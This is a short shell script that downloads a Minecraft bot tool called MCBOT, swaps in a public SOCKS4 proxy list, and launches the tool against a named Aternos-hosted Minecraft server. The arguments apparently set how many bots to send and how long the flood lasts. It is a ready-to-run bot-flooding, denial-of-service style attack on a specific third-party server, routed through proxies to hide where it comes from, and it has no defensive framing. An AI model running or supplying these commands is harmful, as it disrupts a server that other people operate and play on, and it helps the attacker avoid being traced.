git clone https://github.com/dxomg/mcbot
cd mcbot
rm proxies.txt
wget https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt
mv socks4.txt proxies.txt
java -jar MCBOT.jar TikTokLand2.aternos.me 47 longhost 300 40000
